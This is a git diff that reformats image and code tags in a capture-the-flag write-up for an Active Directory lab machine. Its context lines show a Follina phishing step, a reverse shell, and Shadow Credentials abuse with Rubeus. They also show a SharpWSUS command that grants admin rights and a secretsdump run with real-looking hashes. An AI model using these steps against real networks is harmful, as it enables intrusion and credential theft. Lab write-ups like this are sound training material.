@@ -69,7 +69,7 @@ smb: \> ls
 
 When we view the PDF, it talks about how the systems are vulnerable to some CVEs, and that we have to send an email to `itsupport@outdated.htb` for it.
 
-<figure><img src="../../../.gitbook/assets/image (1209).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1209).png>)
 
 We have to sent a link to web applications, meaning someone will click on our links. We can start with researching the vulnerabilities listed in the PDF. The first CVE (also known as Follina) is an RCE vulnerability that makes use of a HTML file that the user has to click to execute arbitrary code.
 
@@ -96,7 +96,7 @@ After waiting for a little bit, we should get a hit on both HTTP servers (one fo
 
 `nc.exe`) and get a reverse shell:
 
-<figure><img src="../../../.gitbook/assets/image (3431).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3431).png>)
 
 ## Privilege Escalation
 
@@ -122,7 +122,7 @@ dir
 
 Then we just need to transfer this file over to our machine via `copy`. Afterwards, start `neo4j` and `bloodhound`, then upload the data. We can find the privilege escalation vector here:
 
-<figure><img src="../../../.gitbook/assets/image (399).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(399).png>)
 
 The `AddKeyCredentialLink` is exploitable using Shadow Credentials.
 
@@ -138,15 +138,15 @@ Then run this:
 
 This should output a huge command for `Rubeus.exe`.
 
-<figure><img src="../../../.gitbook/assets/image (854).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(854).png>)
 
 Download and run `Rubeus.exe` with that command, and we should get a hash to use:
 
-<figure><img src="../../../.gitbook/assets/image (2372).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2372).png>)
 
 Using that NTLM hash, we can PTH and `evil-winrm` in.
 
-<figure><img src="../../../.gitbook/assets/image (1628).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1628).png>)
 
 Grab the user flag.
 
@@ -248,7 +248,6 @@ Unassigned Computers
 
 Then, we can run this command that uses `PsExec.exe` to add ourselves into the administrator group.
 
-{% code overflow="wrap" %}
 ```
 *Evil-WinRM* PS C:\Users\sflowers\desktop> cmd.exe /c 'SharpWSUS.exe create /payload:"C:\Users\sflowers\desktop\PsExec64.exe" /args:"-accepteula -s -d cmd.exe /c \" net localgroup administrators sflowers /add\"" /title:"update"'
 [*] Action: Create Update
@@ -263,7 +262,6 @@ Then, we can run this command that uses `PsExec.exe` to add ourselves into the a
 
 *Evil-WinRM* PS C:\Users\sflowers\desktop> .\SharpWSUS.exe approve /updateid:3d6e513b-b00f-4ca9-941f-038f045e8b15 /computername:dc.outdated.htb /groupname:"groupname"
 ```
-{% endcode %}
 
 Then we need to wait for a while until the update installs. We can check when it installs using this command:
 
@@ -273,20 +271,18 @@ Then we need to wait for a while until the update installs. We can check when it
 
 Once installed, we will see that we are the part of the Administrators group.
 
-<figure><img src="../../../.gitbook/assets/image (3794).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3794).png>)
 
 Then, all we need to do is relog in using `evil-winrm` and we can access the root flag:
 
-<figure><img src="../../../.gitbook/assets/image (2573).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2573).png>)
 
 Alternatively, we can dump the hashes from the entire domain:
 
-{% code overflow="wrap" %}
 ```
 $ secretsdump.py outdated.htb/sflowers@10.129.193.194 -hashes ':1FCDB1F6015DCB318CC77BB2BDA14DB5'
 <TRUNACTED>
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:716f1ce2e2cf38ee1210cce35eb78cb6
 ```
-{% endcode %}
 
-<figure><img src="../../../.gitbook/assets/image (834).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(834).png>)
